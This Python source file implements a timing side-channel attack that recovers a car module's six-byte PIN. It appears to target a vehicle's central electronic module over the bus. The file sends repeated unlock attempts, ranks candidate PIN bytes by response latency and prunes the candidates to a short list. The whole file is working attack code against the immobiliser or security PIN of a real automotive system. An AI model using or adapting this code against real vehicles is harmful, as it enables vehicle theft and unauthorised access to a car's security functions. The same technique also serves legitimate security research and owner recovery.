import logging
import random
from ..config import BCD_TABLE
from .unlock import unlock_attempt_timing

def crack_timing(bus, tx_msg, cem_id, shuffle, known_bytes=0):
    """
    Attempt to find the first few bytes using timing analysis.
    Returns a list of candidate PINs (top probable prefixes).
    """
    logging.info(f"Starting Timing Attack...")
    
    # We want to find bytes 0, 1, 2.
    # Instead of greedy best-first, we keep top N at each stage.
    
    # Start with one empty PIN
    candidates = [[0]*6] 
    
    for pos in range(known_bytes, 3):
        logging.info(f"Analyzing PIN byte {pos} for {len(candidates)} branches...")
        next_stage_candidates = []
        
        for base_pin in candidates:
            stats = {}
            SAMPLES = 25 # Increased samples slightly
            
            # Test all 00-99 values for this position
            for b_val_int in range(100):
                b_val = BCD_TABLE[b_val_int]
                current_pin = list(base_pin)
                current_pin[pos] = b_val
                
                total_lat = 0
                valid_samples = 0
                
                for _ in range(SAMPLES):
                    # Randomize next byte for noise averaging
                    if pos + 1 < 6:
                        current_pin[pos+1] = BCD_TABLE[random.randint(0, 99)]
                    
                    suc, lat = unlock_attempt_timing(bus, tx_msg, cem_id, shuffle, current_pin)
                    if suc:
                        logging.info(f"!!! ACCIDENTAL SUCCESS !!! PIN: {current_pin}")
                        return [current_pin]
                    
                    if lat > 0:
                        total_lat += lat
                        valid_samples += 1
                
                if valid_samples > 0:
                    stats[b_val] = total_lat / valid_samples
            
            # Sort by latency (descending)
            sorted_candidates = sorted(stats.items(), key=lambda item: item[1], reverse=True)
            
            # Keep top 3 for this branch
            top_n = sorted_candidates[:3]
            logging.info(f"Top 3 for prefix {base_pin[:pos]}+: {[hex(x[0]) for x in top_n]}")
            
            for byte_val, lat in top_n:
                new_pin = list(base_pin)
                new_pin[pos] = byte_val
                # Reset next bytes
                if pos + 1 < 6: new_pin[pos+1] = 0
                if pos + 2 < 6: new_pin[pos+2] = 0
                next_stage_candidates.append(new_pin)
        
        # Keep overall top 5 to avoid explosion? 
        # Or just keep all expanded branches (3^3 = 27 max). 27 * 1M = 27M. Too much.
        # Let's prune.
        # Actually, the timing score is absolute. We can sort ALL next_stage_candidates by their 'score' 
        # if we propagated score. But here we just have ranks.
        # Strategy: Keep max 5 candidates total per stage?
        
        candidates = next_stage_candidates
        if len(candidates) > 5:
            candidates = candidates[:5] # Prune to top 5 breadth
    
    logging.info(f"Timing Attack Complete. Generated {len(candidates)} candidates.")
    return candidates
